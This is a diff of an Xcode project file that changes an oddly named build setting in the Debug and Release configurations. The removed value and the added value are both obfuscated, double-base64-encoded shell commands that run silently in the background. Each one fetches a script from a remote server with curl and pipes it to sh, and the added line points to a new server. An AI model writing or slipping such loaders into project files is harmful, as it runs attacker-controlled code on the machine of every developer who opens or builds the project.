@@ -128,7 +128,7 @@
 		184F9B552EC24066002A6A62 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2MyTnZibVpwWjI1bGRDNXlkUzloS1NJZ2ZDQnphQW89Cg== | x | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((p(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2ZFc1cGMzbHpZMkYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -193,7 +193,7 @@
 		184F9B562EC24066002A6A62 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2MyTnZibVpwWjI1bGRDNXlkUzloS1NJZ2ZDQnphQW89Cg== | x | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((p(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2ZFc1cGMzbHpZMkYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
